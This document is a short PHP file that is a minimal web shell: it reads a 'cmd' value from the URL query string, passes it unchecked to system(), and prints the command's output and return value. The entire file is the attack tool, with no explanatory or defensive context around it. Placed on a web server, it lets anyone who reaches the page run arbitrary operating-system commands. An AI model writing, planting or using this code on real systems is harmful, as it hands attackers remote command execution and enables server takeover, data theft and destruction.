<?php

    $cmdwww = $_GET['cmd'];					
    echo '<pre>';
    $last_line = system($cmdwww, $retval);
    echo '
  </pre>
  <hr />Return value: ' . $retval;
?>

